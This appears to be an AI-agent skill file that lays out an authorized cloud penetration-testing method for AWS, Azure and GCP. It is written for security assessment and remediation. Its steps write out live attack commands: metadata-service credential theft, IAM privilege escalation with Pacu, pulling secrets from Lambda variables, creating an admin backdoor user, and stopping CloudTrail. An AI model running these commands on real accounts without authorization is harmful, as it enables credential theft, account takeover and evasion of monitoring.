---
name: conducting-cloud-penetration-testing
description: >
  This skill outlines methodologies for performing authorized penetration testing against
  AWS, Azure, and GCP cloud environments. It covers understanding the shared responsibility
  model for testing scope, leveraging cloud-specific attack tools like Pacu and ScoutSuite,
  exploiting IAM misconfigurations, testing for SSRF to cloud metadata services, and
  reporting findings aligned to MITRE ATT&CK Cloud matrix.
domain: cybersecurity
subdomain: cloud-security
tags: [cloud-pentesting, offensive-security, aws-exploitation, shared-responsibility, mitre-attack-cloud]
version: 1.0.0
author: mahipal
license: Apache-2.0
---

# Conducting Cloud Penetration Testing

## When to Use

- When performing authorized security assessments of cloud environments before production deployment
- When validating cloud security controls after a major architectural change or migration
- When compliance requirements mandate annual penetration testing of cloud infrastructure
- When testing incident response readiness by simulating realistic cloud-based attack scenarios
- When assessing lateral movement risk across multi-account or multi-cloud environments

**Do not use** for unauthorized testing against cloud accounts, for testing cloud provider infrastructure itself (covered by the shared responsibility model), or for DDoS simulation without explicit cloud provider approval.

## Prerequisites

- Written authorization from the cloud account owner and scope definition document
- AWS, Azure, or GCP penetration testing policy acknowledgment (AWS no longer requires pre-approval for most services)
- Isolated testing account or explicitly scoped production account with breakglass procedures
- Cloud-specific offensive tooling installed: Pacu (AWS), ScoutSuite, Prowler, CloudFox
- MITRE ATT&CK Cloud matrix for finding classification

## Workflow

### Step 1: Define Scope and Rules of Engagement

Establish testing boundaries based on the shared responsibility model. The customer is responsible for testing configurations, IAM policies, application security, and data protection. The cloud provider manages physical infrastructure, hypervisor, and managed service internals.

```
Cloud Penetration Test Scope Document
=======================================
Target: AWS Account 123456789012 (Production)
Testing Window: 2025-02-24 08:00 UTC to 2025-02-28 18:00 UTC
Authorization: Signed by CISO, dated 2025-02-20

IN SCOPE:
  - IAM users, roles, policies, and cross-account trust
  - EC2 instances, security groups, and network ACLs
  - S3 bucket policies and data access controls
  - Lambda functions, API Gateway endpoints
  - RDS/DynamoDB access controls and encryption
  - EKS cluster RBAC and network policies
  - CloudTrail, Config, and monitoring gaps

OUT OF SCOPE:
  - AWS managed service internals (RDS engine, Lambda runtime)
  - DDoS attacks or volumetric testing
  - Physical infrastructure or hypervisor attacks
  - Social engineering of AWS support

EMERGENCY CONTACT: security-ops@company.com, +1-555-0199
```

### Step 2: Reconnaissance and Cloud Enumeration

Use cloud-specific tools to enumerate the attack surface: exposed services, public IPs, S3 buckets, IAM configurations, and metadata endpoints.

```bash
# ScoutSuite multi-cloud assessment
scout suite aws --profile target-account --report-dir ./scout-report

# Prowler comprehensive AWS security assessment
prowler aws -M json-ocsf -o ./prowler-output --profile target-account

# CloudFox for identifying privilege escalation paths
cloudfox aws --profile target-account all-checks

# Enumerate public S3 buckets
for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  aws s3api get-bucket-policy-status --bucket $bucket 2>/dev/null | grep -q "true" && echo "PUBLIC: $bucket"
done

# Check for IMDS v1 (vulnerable to SSRF)
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions.HttpTokens]' \
  --output table
```

### Step 3: IAM Privilege Escalation Testing

Use Pacu to identify and exploit IAM misconfigurations that allow privilege escalation from a low-privilege starting point to administrative access.

```bash
# Initialize Pacu session
pacu

# Set stolen or test credentials
set_keys --key-alias test-creds

# Run IAM enumeration modules
run iam__enum_users_roles_policies_groups
run iam__enum_permissions

# Check for privilege escalation paths
run iam__privesc_scan

# Common escalation paths to test:
# 1. iam:CreatePolicyVersion - Create new policy version with admin access
# 2. iam:AttachUserPolicy - Attach AdministratorAccess to self
# 3. iam:PassRole + lambda:CreateFunction - Create Lambda with admin role
# 4. iam:PassRole + ec2:RunInstances - Launch EC2 with admin instance profile
# 5. sts:AssumeRole - Cross-account role assumption without MFA condition
```

### Step 4: SSRF to Cloud Metadata Service Exploitation

Test web applications for Server-Side Request Forgery vulnerabilities that can reach the instance metadata service (IMDS) at 169.254.169.254 to steal IAM role credentials.

```bash
# Test for IMDS v1 access (no token required)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Test for IMDS v2 (requires token - more secure)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure IMDS equivalent
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP metadata service
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### Step 5: Lateral Movement and Data Access

Test cross-account role assumptions, VPC peering connections, and shared resource access to map lateral movement opportunities.

```bash
# Enumerate cross-account role trusts
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS!=`null`]].[RoleName,Arn]' --output table

# Test cross-account assumption
aws sts assume-role \
  --role-arn arn:aws:iam::987654321098:role/CrossAccountRole \
  --role-session-name pentest-session

# Enumerate accessible S3 data with stolen credentials
aws s3 ls --recursive s3://target-bucket/ --summarize

# Check Lambda environment variables for secrets
aws lambda list-functions --query 'Functions[*].[FunctionName]' --output text | while read fn; do
  aws lambda get-function-configuration --function-name "$fn" \
    --query 'Environment.Variables' --output json 2>/dev/null
done
```

### Step 6: Persistence and Detection Evasion Testing

Test whether the organization's monitoring detects persistence mechanisms such as new IAM users, access keys, Lambda backdoors, or CloudTrail disabling.

```bash
# Test: Create backdoor IAM user (authorized test only)
aws iam create-user --user-name pentest-backdoor
aws iam create-access-key --user-name pentest-backdoor
aws iam attach-user-policy --user-name pentest-backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Test: Disable CloudTrail (verify GuardDuty alerts)
aws cloudtrail stop-logging --name management-trail

# Test: Create Lambda for persistence (authorized test only)
# Verify: Did GuardDuty generate Stealth:IAMUser/CloudTrailLoggingDisabled?
# Verify: Did Security Hub alert on the new admin user?

# CLEANUP: Remove all persistence artifacts after testing
aws iam delete-access-key --user-name pentest-backdoor --access-key-id AKIAEXAMPLE
aws iam detach-user-policy --user-name pentest-backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name pentest-backdoor
aws cloudtrail start-logging --name management-trail
```

### Step 7: Report Findings with MITRE ATT&CK Mapping

Document all findings mapped to the MITRE ATT&CK Cloud matrix with severity, proof of concept, business impact, and remediation guidance.

## Key Concepts

| Term | Definition |
|------|------------|
| Shared Responsibility Model | Cloud security framework where the provider secures infrastructure and the customer secures data, configurations, and access controls |
| IMDS | Instance Metadata Service at 169.254.169.254 that provides instance identity, credentials, and configuration data; IMDSv2 requires token-based access |
| Privilege Escalation | Exploiting IAM misconfigurations to elevate from limited permissions to administrative access within a cloud account |
| Lateral Movement | Using compromised credentials or trust relationships to access resources in other accounts, VPCs, or cloud providers |
| Pacu | Open-source AWS exploitation framework for penetration testing, providing modules for enumeration, escalation, and persistence |
| ScoutSuite | Multi-cloud security auditing tool that collects configuration data and generates HTML reports with risk findings |
| MITRE ATT&CK Cloud | Adversary tactics and techniques matrix specific to cloud environments including Initial Access, Execution, Persistence, and Exfiltration |

## Tools & Systems

- **Pacu**: AWS-focused exploitation framework with modules for IAM enumeration, privilege escalation, and persistence testing
- **ScoutSuite**: Multi-cloud (AWS, Azure, GCP) security auditing tool generating comprehensive risk reports from API data collection
- **CloudFox**: AWS and Azure enumeration tool for identifying attack paths, privilege escalation vectors, and data access opportunities
- **Prowler**: Open-source cloud security assessment tool with 300+ checks across AWS, Azure, and GCP
- **Cartography**: Neo4j-based tool that maps relationships between cloud resources for visual attack path analysis

## Common Scenarios

### Scenario: SSRF in Web Application Leads to Full Account Compromise

**Context**: A penetration tester discovers an SSRF vulnerability in a web application hosted on an EC2 instance running IMDSv1. The instance has an IAM role with broad S3 and Lambda permissions.

**Approach**:
1. Exploit the SSRF to reach http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
2. Extract temporary IAM credentials (AccessKeyId, SecretAccessKey, SessionToken)
3. Use the credentials to enumerate accessible S3 buckets and download sensitive data
4. Check if the role has iam:PassRole + lambda:CreateFunction for privilege escalation to admin
5. Document the full attack chain from SSRF to account-level compromise
6. Recommend: enforce IMDSv2, reduce IAM role scope, add VPC endpoint policies blocking IMDS from application tier

**Pitfalls**: Not testing IMDSv2 enforcement separately from IMDSv1 gives incomplete results. Failing to clean up test artifacts (backdoor users, Lambda functions) leaves real vulnerabilities after the engagement.

## Output Format

```
Cloud Penetration Test Report
===============================
Target: AWS Account 123456789012 (Production)
Testing Period: 2025-02-24 to 2025-02-28
Methodology: MITRE ATT&CK Cloud + OWASP Cloud Testing Guide
Tester: Security Team - Authorized Engagement

EXECUTIVE SUMMARY:
  Starting with read-only developer credentials, the assessment achieved
  full administrative access to the production account within 3 hours through
  an IAM privilege escalation chain. 47 findings identified across 7 ATT&CK tactics.

CRITICAL FINDINGS:
[PT-001] IAM Privilege Escalation via iam:CreatePolicyVersion
  ATT&CK: T1098.001 (Account Manipulation: Additional Cloud Credentials)
  Severity: CRITICAL
  Starting Point: Developer role with iam:CreatePolicyVersion permission
  Impact: Full administrative access to all account resources
  Evidence: Created policy version granting iam:* and s3:* to test role
  Remediation: Remove iam:CreatePolicyVersion from developer roles, add permission boundary

[PT-002] SSRF to IMDS Credential Theft
  ATT&CK: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)
  Severity: CRITICAL
  Starting Point: Web application URL parameter vulnerable to SSRF
  Impact: Extracted IAM role credentials with S3 and Lambda access
  Remediation: Enforce IMDSv2, apply WAF rules for SSRF, restrict IAM role scope

FINDING SUMMARY BY MITRE ATT&CK TACTIC:
  Initial Access:       4 findings
  Execution:            3 findings
  Persistence:          6 findings
  Privilege Escalation: 8 findings (3 Critical)
  Defense Evasion:      5 findings
  Credential Access:    7 findings
  Discovery:           14 findings
  Total:               47 findings
```
